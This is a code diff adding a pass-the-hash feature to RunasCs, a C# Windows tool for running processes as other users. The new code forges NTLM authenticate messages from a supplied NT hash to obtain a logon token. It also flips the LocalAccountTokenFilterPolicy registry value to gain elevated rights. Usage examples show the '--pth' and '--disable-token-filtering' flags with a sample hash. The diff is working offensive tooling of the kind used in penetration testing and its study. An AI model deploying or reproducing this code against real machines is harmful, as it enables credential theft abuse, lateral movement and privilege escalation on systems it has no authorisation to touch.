@@ -5,8 +5,10 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.Net.Sockets;
 using System.Security.Principal;
+using System.Security.Cryptography;
 using System.ComponentModel;
 using System.Net;
+using Microsoft.Win32;
 
 public class RunasCsException : Exception
 {
@@ -126,7 +128,7 @@ public class RunasCs
         [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 129)]
         internal string szSystemStatus;
     }
-
+    
     private enum SE_OBJECT_TYPE
     {
         SE_UNKNOWN_OBJECT_TYPE = 0,
@@ -603,15 +605,25 @@ public class RunasCs
         }
     }
 
-    private void RunasCreateProcessWithTokenW(string username, string domainName, string password, string commandLine, int logonType, uint logonFlags, int logonProvider, ref STARTUPINFO startupInfo, ref ProcessInformation processInfo, ref int logonTypeNotFiltered) {
-        IntPtr hToken = IntPtr.Zero;
+    private void RunasCreateProcessWithTokenW(string username, string domainName, string password, string commandLine, int logonType, uint logonFlags, int logonProvider, ref STARTUPINFO startupInfo, ref ProcessInformation processInfo, ref int logonTypeNotFiltered, IntPtr hToken) {
         IntPtr hTokenDuplicate = IntPtr.Zero;
-        if (!LogonUser(username, domainName, password, logonType, logonProvider, ref hToken))
-            throw new RunasCsException("LogonUser", true);
+        bool checkLimitedLogon = true;
+
+        if (hToken == IntPtr.Zero) {
+            if (!LogonUser(username, domainName, password, logonType, logonProvider, ref hToken))
+                throw new RunasCsException("LogonUser", true);
+        } else {
+            checkLimitedLogon = false;
+        }
+        
         if (!DuplicateTokenEx(hToken, AccessToken.TOKEN_ALL_ACCESS, IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TokenPrimary, ref hTokenDuplicate))
             throw new RunasCsException("DuplicateTokenEx", true);
-        if (IsLimitedUserLogon(hTokenDuplicate, username, domainName, password, out logonTypeNotFiltered))
-            Console.Out.WriteLine(String.Format("[*] Warning: Logon for user '{0}' is limited. Use the --logon-type value '{1}' to obtain a more privileged token", username, logonTypeNotFiltered));
+
+        if (checkLimitedLogon) {
+            if (IsLimitedUserLogon(hTokenDuplicate, username, domainName, password, out logonTypeNotFiltered))
+                Console.Out.WriteLine(String.Format("[*] Warning: Logon for user '{0}' is limited. Use the --logon-type value '{1}' to obtain a more privileged token", username, logonTypeNotFiltered));
+        }
+        
         // Enable SeImpersonatePrivilege on our current process needed by the seclogon to make the CreateProcessWithTokenW call
         AccessToken.EnablePrivilege("SeImpersonatePrivilege", WindowsIdentity.GetCurrent().Token);
         // Enable all privileges for the token of the new process
@@ -670,7 +682,24 @@ public class RunasCs
         this.stationDaclObj = null;
     }
 
-    public string RunAs(string username, string password, string cmd, string domainName, uint processTimeout, int logonType, int createProcessFunction, string[] remote, bool forceUserProfileCreation, bool bypassUac, bool remoteImpersonation)
+    private byte[] ConvertNtHashToByteArray(string ntHash)
+    {
+        // Validate the NT hash (it should be an even length string of hexadecimal characters)
+        if (ntHash.Length != 32 || !System.Text.RegularExpressions.Regex.IsMatch(ntHash, @"^[0-9A-Fa-f]+$"))
+        {
+            throw new ArgumentException("Invalid NT hash format.");
+        }
+
+        byte[] byteArray = new byte[ntHash.Length / 2];
+        for (int i = 0; i < ntHash.Length; i += 2)
+        {
+            byteArray[i / 2] = Convert.ToByte(ntHash.Substring(i, 2), 16);
+        }
+
+        return byteArray; 
+    }
+    
+    public string RunAs(string username, string password, string cmd, string domainName, uint processTimeout, int logonType, int createProcessFunction, string[] remote, bool forceUserProfileCreation, bool bypassUac, bool remoteImpersonation, bool passTheHash, bool disableTokenFiltering)
     /*
         int createProcessFunction:
             0: CreateProcessAsUserW();
@@ -696,33 +725,88 @@ public class RunasCs
             logonProvider = LOGON32_PROVIDER_WINNT50;
             if (domainName == "") // fixing bugs in seclogon when using LOGON32_LOGON_NEW_CREDENTIALS...
                 domainName = ".";
-        } 
-        // we check if the user has been granted the logon type requested, if not we show a message suggesting which logon type can be used to succesfully logon
-        CheckAvailableUserLogonType(username, password, domainName, logonType, logonProvider);
-        // Use the proper CreateProcess* function
-        if (remoteImpersonation)
-            RunasRemoteImpersonation(username, domainName, password, logonType, logonProvider, commandLine, ref startupInfo, ref processInfo, ref logonTypeNotFiltered);
-        else {
-            bool userProfileExists;
-            uint logonFlags = 0;
-            userProfileExists = IsUserProfileCreated(username, password, domainName, logonType);
-            // we load the user profile only if it has been already created or the creation is forced from the flag --force-profile
-            if (userProfileExists || forceUserProfileCreation)
-                logonFlags = LOGON_WITH_PROFILE;
-            if (logonType != LOGON32_LOGON_NEW_CREDENTIALS && !forceUserProfileCreation && !userProfileExists)
-                Console.Out.WriteLine("[*] Warning: User profile directory for user " + username + " does not exists. Use --force-profile if you want to force the creation.");
-            if (createProcessFunction == 2)
-                RunasCreateProcessWithLogonW(username, domainName, password, logonType, logonFlags, commandLine, bypassUac, ref startupInfo, ref processInfo, ref logonTypeNotFiltered);
-            else
+        }
+
+        if (passTheHash) {
+            // perform pass the hash
+
+            // set the default as workgroup
+            // so this will work for any local user
+            if (domainName == "") {
+                domainName = "WORKGROUP";
+            }
+            
+            byte[] ntHash;
+            
+            // convert the password hash to a byte array
+            try
             {
-                if (bypassUac)
-                    throw new RunasCsException(String.Format("The flag --bypass-uac is not compatible with {0} but only with --function '2' (CreateProcessWithLogonW)", GetProcessFunction(createProcessFunction)));
-                if (createProcessFunction == 0)
-                    RunasCreateProcessAsUserW(username, domainName, password, logonType, logonProvider, commandLine, forceUserProfileCreation, userProfileExists, ref startupInfo, ref processInfo, ref logonTypeNotFiltered);
-                else if (createProcessFunction == 1)
-                    RunasCreateProcessWithTokenW(username, domainName, password, commandLine, logonType, logonFlags, logonProvider, ref startupInfo, ref processInfo, ref logonTypeNotFiltered);
+                ntHash = ConvertNtHashToByteArray(password);
+            }
+            catch (ArgumentException e)
+            {
+                Console.WriteLine("[-] " + e.Message);
+                return "";
+            }
+            
+            object oldFilterPolicy = null;
+            IntPtr hToken = IntPtr.Zero;
+            
+            RunasNtlmPth ntlmAuth = new RunasNtlmPth();
+
+            // disable token filtering in order to run an elevated process
+            if (disableTokenFiltering)
+            {
+                oldFilterPolicy = ntlmAuth.DisableTokenFiltering();
+            }
+            
+            // get the token and run the process
+            try
+            {
+                hToken = ntlmAuth.RunasNtlm(username, domainName, ntHash);
+            }
+            catch (RunasCsException e)
+            {
+                Console.WriteLine(e.Message);
+                return "";
+            }
+            
+            RunasCreateProcessWithTokenW(username, domainName, password, commandLine, logonType, 0, logonProvider, ref startupInfo, ref processInfo, ref logonTypeNotFiltered, hToken);
+
+            // restore token filtering
+            if (disableTokenFiltering)
+            {
+                ntlmAuth.RestoreTokenFiltering(oldFilterPolicy);
+            }
+        } else {
+            // we check if the user has been granted the logon type requested, if not we show a message suggesting which logon type can be used to succesfully logon
+            CheckAvailableUserLogonType(username, password, domainName, logonType, logonProvider);
+            
+            // Use the proper CreateProcess* function
+            if (remoteImpersonation)
+                RunasRemoteImpersonation(username, domainName, password, logonType, logonProvider, commandLine, ref startupInfo, ref processInfo, ref logonTypeNotFiltered);
+            else {
+                bool userProfileExists;
+                uint logonFlags = 0;
+                userProfileExists = IsUserProfileCreated(username, password, domainName, logonType);
+                // we load the user profile only if it has been already created or the creation is forced from the flag --force-profile
+                if (userProfileExists || forceUserProfileCreation)
+                    logonFlags = LOGON_WITH_PROFILE;
+                if (logonType != LOGON32_LOGON_NEW_CREDENTIALS && !forceUserProfileCreation && !userProfileExists)
+                    Console.Out.WriteLine("[*] Warning: User profile directory for user " + username + " does not exists. Use --force-profile if you want to force the creation.");
+                if (createProcessFunction == 2)
+                    RunasCreateProcessWithLogonW(username, domainName, password, logonType, logonFlags, commandLine, bypassUac, ref startupInfo, ref processInfo, ref logonTypeNotFiltered);
+                else {
+                    if (bypassUac)
+                        throw new RunasCsException(String.Format("The flag --bypass-uac is not compatible with {0} but only with --function '2' (CreateProcessWithLogonW)", GetProcessFunction(createProcessFunction)));
+                    if (createProcessFunction == 0)
+                        RunasCreateProcessAsUserW(username, domainName, password, logonType, logonProvider, commandLine, forceUserProfileCreation, userProfileExists, ref startupInfo, ref processInfo, ref logonTypeNotFiltered);
+                    else if (createProcessFunction == 1)
+                        RunasCreateProcessWithTokenW(username, domainName, password, commandLine, logonType, logonFlags, logonProvider, ref startupInfo, ref processInfo, ref logonTypeNotFiltered, IntPtr.Zero);
+                }
             }
         }
+        
         Console.Out.Flush();  // flushing console before waiting for child process execution
         string output = "";
         if (processTimeout > 0) {
@@ -745,6 +829,536 @@ public class RunasCs
         CloseHandle(processInfo.thread);
         this.CleanupHandles();
         return output;
+    }
+}
+
+public class RunasNtlmPth
+{
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct SecHandle
+    {
+        public UIntPtr dwLower;
+        public UIntPtr dwUpper;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct TimeStamp
+    {
+        public long QuadPart;
+    }
+    
+    private enum SecBufferType : uint
+    {
+        SECBUFFER_EMPTY = 0,
+        SECBUFFER_VERSION = 0,
+        SECBUFFER_TOKEN = 2,
+    }
+
+    private enum SecurityStatus : uint
+    {
+        SEC_I_OK = 0,
+        SEC_E_INSUFFICIENT_MEMORY = 0x80090300,
+        SEC_E_INVALID_HANDLE = 0x80090301,
+        SEC_E_LOGON_DENIED = 0x8009030C,
+        SEC_I_CONTINUE_NEEDED = 0x0090312,
+        SEC_I_COMPLETE_NEEDED = 0x0090313,
+        SEC_I_COMPLETE_AND_CONTINUE = 0x0090314,
+    }
+    
+    [StructLayout(LayoutKind.Sequential)]
+    private struct SEC_WINNT_AUTH_IDENTITY_W
+    {
+        public string User;
+        public uint UserLength;
+        public string Domain;
+        public uint DomainLength;
+        public string Password;
+        public uint PasswordLength;
+        public uint Flags;
+    }
+    
+    [DllImport("secur32.dll", CharSet = CharSet.Auto)]
+    static extern SecurityStatus AcquireCredentialsHandle(
+        string pszPrincipal,
+        string pszPackage,
+        int fCredentialUse,
+        IntPtr PAuthenticationID,
+        ref SEC_WINNT_AUTH_IDENTITY_W pAuthData,
+        int pGetKeyFn,
+        IntPtr pvGetKeyArgument,
+        ref SecHandle phCredential,
+        IntPtr ptsExpiry
+    );
+
+    [DllImport("secur32.dll", CharSet = CharSet.Auto)]
+    static extern SecurityStatus InitializeSecurityContext(
+        ref SecHandle phCredential,
+        IntPtr phContext,
+        string pszTargetName,
+        int fContextReq,
+        int Reserved1,
+        int TargetDataRep,
+        IntPtr pInput,
+        int Reserved2,
+        out SecHandle phNewContext,
+        out SecBufferDesc pOutput,
+        out uint pfContextAttr,
+        IntPtr ptsExpiry
+    );
+
+    [DllImport("secur32.dll", CharSet = CharSet.Auto)]
+    static extern SecurityStatus InitializeSecurityContext(
+        ref SecHandle phCredential,
+        ref SecHandle phContext,
+        string pszTargetName,
+        int fContextReq,
+        int Reserved1,
+        int TargetDataRep,
+        ref SecBufferDesc SecBufferDesc,
+        int Reserved2,
+        out SecHandle phNewContext,
+        out SecBufferDesc pOutput,
+        out uint pfContextAttr,
+        IntPtr ptsExpiry
+    );
+
+    [DllImport("secur32.dll")]
+    static extern SecurityStatus AcceptSecurityContext(
+        ref SecHandle phCredential,
+        IntPtr phContext,
+        ref SecBufferDesc pInput,
+        uint fContextReq,
+        uint TargetDataRep,
+        out SecHandle phNewContext,
+        out SecBufferDesc pOutput,
+        out uint pfContextAttr,
+        IntPtr ptsTimeStamp
+    );
+    
+    [DllImport("secur32.dll")]
+    static extern SecurityStatus AcceptSecurityContext(
+        ref SecHandle phCredential,
+        ref SecHandle phContext,
+        ref SecBufferDesc pInput,
+        uint fContextReq,
+        uint TargetDataRep,
+        out SecHandle phNewContext,
+        IntPtr pOutput,
+        out uint pfContextAttr,
+        IntPtr ptsTimeStamp
+    );
+    
+    [DllImport("secur32.dll")]
+    static extern SecurityStatus QuerySecurityContextToken(
+        ref SecHandle phContext,
+        out IntPtr Token
+    );
+    
+    // took from InternalMonologue.cs
+    // https://github.com/eladshamir/Internal-Monologue 
+    // credits goes to Elad Shamir for this code
+    const int MAX_TOKEN_SIZE = 12288;
+    struct SecBuffer : IDisposable
+    {
+        public int cbBuffer;
+        public int BufferType;
+        public IntPtr pvBuffer;
+
+        public SecBuffer(int bufferSize)
+        {
+            cbBuffer = bufferSize;
+            BufferType = 2;
+            pvBuffer = Marshal.AllocHGlobal(bufferSize);
+        }
+
+        public SecBuffer(byte[] secBufferBytes)
+        {
+            cbBuffer = secBufferBytes.Length;
+            BufferType = 2;
+            pvBuffer = Marshal.AllocHGlobal(cbBuffer);
+            Marshal.Copy(secBufferBytes, 0, pvBuffer, cbBuffer);
+        }
+
+        public SecBuffer(byte[] secBufferBytes, int bufferType)
+        {
+            cbBuffer = secBufferBytes.Length;
+            BufferType = (int)bufferType;
+            pvBuffer = Marshal.AllocHGlobal(cbBuffer);
+            Marshal.Copy(secBufferBytes, 0, pvBuffer, cbBuffer);
+        }
+
+        public void Dispose()
+        {
+            if (pvBuffer != IntPtr.Zero)
+            {
+                Marshal.FreeHGlobal(pvBuffer);
+                pvBuffer = IntPtr.Zero;
+            }
+        }
+    }
+    
+    struct SecBufferDesc : IDisposable
+    {
+        public int ulVersion;
+        public int cBuffers;
+        public IntPtr pBuffers;
+
+        public SecBufferDesc(int bufferSize)
+        {
+            ulVersion = 0;
+            cBuffers = 1;
+            SecBuffer ThisSecBuffer = new SecBuffer(bufferSize);
+            pBuffers = Marshal.AllocHGlobal(Marshal.SizeOf(ThisSecBuffer));
+            Marshal.StructureToPtr(ThisSecBuffer, pBuffers, false);
+        }
+
+        public SecBufferDesc(byte[] secBufferBytes)
+        {
+            ulVersion = 0;
+            cBuffers = 1;
+            SecBuffer ThisSecBuffer = new SecBuffer(secBufferBytes);
+            pBuffers = Marshal.AllocHGlobal(Marshal.SizeOf(ThisSecBuffer));
+            Marshal.StructureToPtr(ThisSecBuffer, pBuffers, false);
+        }
+
+        public void Dispose()
+        {
+            if (pBuffers != IntPtr.Zero)
+            {
+                if (cBuffers == 1)
+                {
+                    SecBuffer ThisSecBuffer = (SecBuffer)Marshal.PtrToStructure(pBuffers, typeof(SecBuffer));
+                    ThisSecBuffer.Dispose();
+                }
+                else
+                {
+                    for (int Index = 0; Index < cBuffers; Index++)
+                    {
+                        int CurrentOffset = Index * Marshal.SizeOf(typeof(SecBuffer));
+                        IntPtr SecBufferpvBuffer = Marshal.ReadIntPtr(pBuffers, CurrentOffset + Marshal.SizeOf(typeof(int)) + Marshal.SizeOf(typeof(int)));
+                        Marshal.FreeHGlobal(SecBufferpvBuffer);
+                    }
+                }
+
+                Marshal.FreeHGlobal(pBuffers);
+                pBuffers = IntPtr.Zero;
+            }
+        }
+
+        public byte[] GetSecBufferByteArray()
+        {
+            byte[] Buffer = null;
+
+            if (pBuffers == IntPtr.Zero)
+            {
+                throw new InvalidOperationException("Object has already been disposed!!!");
+            }
+
+            if (cBuffers == 1)
+            {
+                SecBuffer ThisSecBuffer = (SecBuffer)Marshal.PtrToStructure(pBuffers, typeof(SecBuffer));
+
+                if (ThisSecBuffer.cbBuffer > 0)
+                {
+                    Buffer = new byte[ThisSecBuffer.cbBuffer];
+                    Marshal.Copy(ThisSecBuffer.pvBuffer, Buffer, 0, ThisSecBuffer.cbBuffer);
+                }
+            }
+            else
+            {
+                int BytesToAllocate = 0;
+
+                for (int Index = 0; Index < cBuffers; Index++)
+                {
+                    //calculate the total number of bytes we need to copy...
+                    int CurrentOffset = Index * Marshal.SizeOf(typeof(SecBuffer));
+                    BytesToAllocate += Marshal.ReadInt32(pBuffers, CurrentOffset);
+                }
+
+                Buffer = new byte[BytesToAllocate];
+
+                for (int Index = 0, BufferIndex = 0; Index < cBuffers; Index++)
+                {
+                    //Now iterate over the individual buffers and put them together into a byte array...
+                    int CurrentOffset = Index * Marshal.SizeOf(typeof(SecBuffer));
+                    int BytesToCopy = Marshal.ReadInt32(pBuffers, CurrentOffset);
+                    IntPtr SecBufferpvBuffer = Marshal.ReadIntPtr(pBuffers, CurrentOffset + Marshal.SizeOf(typeof(int)) + Marshal.SizeOf(typeof(int)));
+                    Marshal.Copy(SecBufferpvBuffer, Buffer, BufferIndex, BytesToCopy);
+                    BufferIndex += BytesToCopy;
+                }
+            }
+
+            return (Buffer);
+        }
+    }
+    
+    // also took from Elad Shamir Internal Monologue project
+    private object GetRegKey(string key, string name)
+    {
+        object value = null;
+        
+        RegistryKey Lsa = Registry.LocalMachine.OpenSubKey(key);
+        if (Lsa != null)
+        {
+            value = Lsa.GetValue(name);
+        }
+
+        return value;
+    }
+
+    // also took from Elad Shamir Internal Monologue project
+    private void SetRegKey(string key, string name, object value)
+    {
+        RegistryKey Lsa = Registry.LocalMachine.OpenSubKey(key, true);
+        if (Lsa != null)
+        {
+            if (value == null)
+            {
+                Lsa.DeleteValue(name);
+            }
+            else
+            {
+                Lsa.SetValue(name, value);
+            }
+        }
+    } 
+    
+    public byte[] GetMd5Hmac(byte[] key, object data)
+    {
+        using (var algo = new HMACMD5(key))
+        {
+            byte[] dataBytes;
+            if (data is string)
+            {
+                dataBytes = Encoding.Unicode.GetBytes((string)data);
+            }
+            else if (data is byte[])
+            {
+                dataBytes = (byte[])data;
+            }
+            else
+            {
+                throw new ArgumentException("Data must be a string or a byte array.");
+            }
+
+            return algo.ComputeHash(dataBytes);
+        }
+    }
+    
+    private const string regKey = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";
+    private const string regValue = "LocalAccountTokenFilterPolicy";
+
+    public object DisableTokenFiltering()
+    {
+        // get the value
+        object OldfilterPolicy = GetRegKey(@"", regKey);
+        
+        // change the value 
+        SetRegKey(regKey, regValue, 1);
+
+        return OldfilterPolicy;
+    }
+
+    public void RestoreTokenFiltering(object value)
+    {
+        SetRegKey(regKey, regValue, value);
+    }
+    
+    public IntPtr RunasNtlm(string username, string domain, byte[] passwordHash)
+    {
+        // initialize tokens
+        SecBufferDesc negotiateToken = new SecBufferDesc(MAX_TOKEN_SIZE);
+        SecBufferDesc challengeToken = new SecBufferDesc(MAX_TOKEN_SIZE);
+        SecBufferDesc authenticateToken = new SecBufferDesc(MAX_TOKEN_SIZE);
+       
+        SecHandle creds = new SecHandle();
+        SecHandle clientCtx;
+        SecHandle serverCtx;
+        IntPtr accessToken;
+        uint flags = 0;
+        
+        SEC_WINNT_AUTH_IDENTITY_W identity = new SEC_WINNT_AUTH_IDENTITY_W
+        {
+            Domain = domain,
+            DomainLength = (uint)domain.Length,
+            User = username, 
+            UserLength = (uint)username.Length,
+            Flags = 1,
+        };
+        
+        SecurityStatus ss = AcquireCredentialsHandle(
+            null,
+            "NTLM",
+            0x03,
+            IntPtr.Zero,
+            ref identity,
+            0,
+            IntPtr.Zero,
+            ref creds,
+            IntPtr.Zero
+        );
+
+        if (ss != SecurityStatus.SEC_I_OK)
+        {
+            throw new RunasCsException("AcquireCredentialHandle failed with error: " + ss);
+        }
+        
+        // get the negotiate token
+        ss = InitializeSecurityContext(
+            ref creds,
+            IntPtr.Zero,
+            null,
+            0x00000800,
+            0,
+            0x10,
+            IntPtr.Zero,
+            0,
+            out clientCtx,
+            out negotiateToken,
+            out flags,
+            IntPtr.Zero
+        );
+
+        if (ss != SecurityStatus.SEC_I_CONTINUE_NEEDED)
+        {
+            throw new RunasCsException("InitializeSecurityContext failed with error: " + ss);
+        }
+        
+        // get the challenge token
+        ss = AcceptSecurityContext(
+            ref creds,
+            IntPtr.Zero,
+            ref negotiateToken,
+            0x00000800,
+            0x10,
+            out serverCtx,
+            out challengeToken,
+            out flags,
+            IntPtr.Zero
+        );
+
+        if (ss != SecurityStatus.SEC_I_CONTINUE_NEEDED)
+        {
+            throw new RunasCsException("AcceptSecurityContext failed with error: " + ss);
+        }
+            
+        // get the authenticate token
+        ss = InitializeSecurityContext(
+            ref creds,
+            ref clientCtx,
+            null,
+            0x00000800,
+            0,
+            0x10,
+            ref challengeToken,
+            0,
+            out clientCtx,
+            out authenticateToken,
+            out flags,
+            IntPtr.Zero
+        );
+        
+        if (ss != SecurityStatus.SEC_I_OK)
+        {
+            throw new RunasCsException("InitializedSecurityContext failed with error: " + ss);
+        }
+        
+        // negotiate token to bytes
+        SecBuffer secNegotiateToken = Marshal.PtrToStructure<SecBuffer>(negotiateToken.pBuffers);
+        byte[] pNegotiateToken = new byte[secNegotiateToken.cbBuffer];
+        Marshal.Copy(secNegotiateToken.pvBuffer, pNegotiateToken, 0, secNegotiateToken.cbBuffer);
+        
+        // challenge token to bytes
+        SecBuffer secChallengeToken = Marshal.PtrToStructure<SecBuffer>(challengeToken.pBuffers);
+        byte[] pChallengeToken = new byte[secChallengeToken.cbBuffer];
+        Marshal.Copy(secChallengeToken.pvBuffer, pChallengeToken, 0, secChallengeToken.cbBuffer);
+        
+        // authenticate token to bytes
+        SecBuffer secAuthenticateToken = Marshal.PtrToStructure<SecBuffer>(authenticateToken.pBuffers);
+        byte[] pAuthenticateToken = new byte[secAuthenticateToken.cbBuffer];
+        Marshal.Copy(secAuthenticateToken.pvBuffer, pAuthenticateToken, 0, secAuthenticateToken.cbBuffer);
+            
+        // calculate Nt0wfv2
+        byte[] ntOwfv2 = GetMd5Hmac(passwordHash, username.ToUpper() + domain);
+        
+        // the steps below are used to calculate NtProofStr (challenge response)
+        // get the server challenge
+        byte[] serverChallenge = new byte[8];
+        Array.Copy(pChallengeToken, 24, serverChallenge, 0, 8);
+        
+        // get the nt challenge response field
+        int sizeChallengeResponse = BitConverter.ToInt16(pAuthenticateToken, 20) - 16;
+        int offsetChallengeResponse = BitConverter.ToInt32(pAuthenticateToken, 24);
+        byte[] ntChallengeResponse = new byte[sizeChallengeResponse];
+        Array.Copy(pAuthenticateToken, offsetChallengeResponse + 16, ntChallengeResponse, 0, sizeChallengeResponse);
+
+        // concatenate the two fields
+        byte[] combinedData = new byte[sizeChallengeResponse + 8];
+        Array.Copy(serverChallenge, 0, combinedData, 0, serverChallenge.Length);
+        Array.Copy(ntChallengeResponse, 0, combinedData, 8, ntChallengeResponse.Length);
+        
+        // make the calculation
+        byte[] ntProofStr = GetMd5Hmac(ntOwfv2, combinedData);
+        
+        // replace the challenge response
+        Array.Copy(ntProofStr, 0, pAuthenticateToken, offsetChallengeResponse, 16);
+        
+        // the steps below are used to calculate the MIC
+        // reset the mic
+        Array.Clear(pAuthenticateToken, 72, 16);
+        
+        // calculate the session key
+        byte[] session_key = GetMd5Hmac(ntOwfv2, ntProofStr);
+        
+        // concatenate the 3 tokens
+        combinedData = new byte[pNegotiateToken.Length + pChallengeToken.Length + pAuthenticateToken.Length];
+        Array.Copy(pNegotiateToken, 0, combinedData, 0, pNegotiateToken.Length);
+        Array.Copy(pChallengeToken, 0, combinedData, pNegotiateToken.Length, pChallengeToken.Length);
+        Array.Copy(pAuthenticateToken, 0, combinedData, pNegotiateToken.Length + pChallengeToken.Length, pAuthenticateToken.Length);
+        
+        // calculate the mic
+        byte[] mic = GetMd5Hmac(session_key, combinedData);
+        
+        // replace the mic
+        Array.Copy(mic, 0, pAuthenticateToken, 72, 16);
+        
+        // write the new patched token
+        secAuthenticateToken.pvBuffer = Marshal.AllocHGlobal(pAuthenticateToken.Length);
+        Marshal.Copy(pAuthenticateToken, 0, secAuthenticateToken.pvBuffer, pAuthenticateToken.Length);
+        authenticateToken.pBuffers = Marshal.AllocHGlobal(Marshal.SizeOf(secAuthenticateToken));
+        Marshal.StructureToPtr(secAuthenticateToken, authenticateToken.pBuffers, false);
+
+        // make the server validate the authenticate token
+        ss = AcceptSecurityContext(
+            ref creds,
+            ref serverCtx,
+            ref authenticateToken,
+            0x00000800,
+            0x10,
+            out serverCtx,
+            IntPtr.Zero,
+            out flags,
+            IntPtr.Zero
+        );
+        
+        if (ss != SecurityStatus.SEC_I_OK)
+        {
+            throw new RunasCsException("AcceptSecurityContext failed with error: " + ss);
+        }
+        
+        // get an access token
+        ss = QuerySecurityContextToken(
+            ref serverCtx,
+            out accessToken 
+        );
+        
+        if (ss != SecurityStatus.SEC_I_OK)
+        {
+            throw new RunasCsException("QuerySecurityContextToken failed with error: " + ss);
+        }
+
+        return accessToken;
     }
 }
 
@@ -1673,7 +2287,7 @@ public static class RunasCsMainClass
 RunasCs v1.5 - @splinter_code
 
 Usage:
-    RunasCs.exe username password cmd [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t process_timeout] [--force-profile] [--bypass-uac] [--remote-impersonation]
+    RunasCs.exe username password cmd [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t process_timeout] [--force-profile] [--bypass-uac] [--remote-impersonation] [--pth] [--disable-token-filtering]
 
 Description:
     RunasCs is an utility to run specific processes under a different user account
@@ -1723,6 +2337,12 @@ Optional arguments:
     -i, --remote-impersonation     
                             spawn a new process and assign the token of the 
                             logged on user to the main thread.
+    --pth
+                            consider the input password as a nt hash and perform pass-the-hash instead.
+    --disable-token-filtering
+                            disable token filtering when doing pass-the-hash
+                            if the target user is an administrator and that option is not set the
+                            process won't run as an elevated process.
 
 Examples:
     Run a command as a local user
@@ -1739,6 +2359,10 @@ Examples:
         RunasCs.exe adm1 password1 ""cmd /c whoami /priv"" --bypass-uac
     Run a command as an Administrator through remote impersonation
         RunasCs.exe adm1 password1 ""cmd /c echo admin > C:\Windows\admin"" -l 8 --remote-impersonation 
+    Run a command using pass the hash
+        RunasCs.exe user1 5835048ce94ad0564e29a924a03510ef ""cmd /c whoami /all"" --pth
+    Run a command using pass the hash and elevated (otherwise not all privileges are set)
+        RunasCs.exe user1 5835048ce94ad0564e29a924a03510ef ""cmd /c whoami /all"" --pth --disable-token-filtering
 ";
     
     // .NETv2 does not allow dict initialization with values. Therefore, we need a function :(
@@ -1876,7 +2500,7 @@ Examples:
         string[] remote = null;
         uint processTimeout = 120000;
         int logonType = 2, createProcessFunction = DefaultCreateProcessFunction();
-        bool forceUserProfileCreation = false, bypassUac = false, remoteImpersonation = false;
+        bool forceUserProfileCreation = false, bypassUac = false, remoteImpersonation = false, passTheHash = false, disableTokenFiltering = false;
         
         try {
             for(int ctr = 0; ctr < args.Length; ctr++) {
@@ -1922,6 +2546,14 @@ Examples:
                     case "--remote-impersonation":
                         remoteImpersonation = true;
                         break;
+                    
+                    case "--pth":
+                        passTheHash = true;
+                        break;
+                    
+                    case "--disable-token-filtering":
+                        disableTokenFiltering = true;
+                        break;
 
                     default:
                         positionals.Add(args[ctr]);
@@ -1948,7 +2580,7 @@ Examples:
 
         RunasCs invoker = new RunasCs();
         try {
-            output = invoker.RunAs(username, password, cmd, domain, processTimeout, logonType, createProcessFunction, remote, forceUserProfileCreation, bypassUac, remoteImpersonation);
+            output = invoker.RunAs(username, password, cmd, domain, processTimeout, logonType, createProcessFunction, remote, forceUserProfileCreation, bypassUac, remoteImpersonation, passTheHash, disableTokenFiltering);
         } catch(RunasCsException e) {
             invoker.CleanupHandles();
             output = String.Format("{0}", e.Message);
